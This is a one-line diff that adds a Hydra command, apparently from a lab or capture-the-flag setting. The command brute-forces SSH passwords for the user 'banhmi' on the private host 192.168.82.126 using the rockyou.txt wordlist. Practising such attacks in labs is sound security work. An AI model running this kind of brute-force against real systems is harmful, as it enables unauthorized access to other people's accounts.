@@ -1,0 +1,1 @@
+hydra -l banhmi -P /usr/share/wordlists/rockyou.txt 192.168.82.126 ssh -t 10 -v 
